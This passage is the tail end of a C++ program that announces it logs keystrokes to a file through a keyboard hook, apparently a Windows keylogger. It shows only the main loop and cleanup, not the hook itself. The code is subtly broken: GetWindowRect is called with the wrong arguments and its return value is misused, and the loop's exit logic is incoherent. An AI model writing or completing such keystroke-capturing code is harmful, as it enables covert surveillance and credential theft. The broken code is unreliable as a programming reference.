    InitializeHook();
    cout << "Keyboard hook initialized. Logging keystrokes to " << FILENAME << endl;

    while (true) {
        Sleep(100); // Prevent high CPU usage
        // Check if the window is covering the entire screen
        HWND hwnd = GetMainWnd();
        RECT windowRect = {0, 0, 0, 0};
        GetWindowRect(hwnd, &windowRect);
        if (windowRect.left == 0 && windowRect.top == 0 &&
            windowRect.right == GetWindowRect(GetDesktopWindow()).right &&
            windowRect.bottom == GetWindowRect(GetDesktopWindow()).bottom) {
            // If the hook is visible, break the loop
            cout << "Hook window is visible. Exiting..." << endl;
            break;
        }
    }

    CleanupHook();
    return 0;
}
```

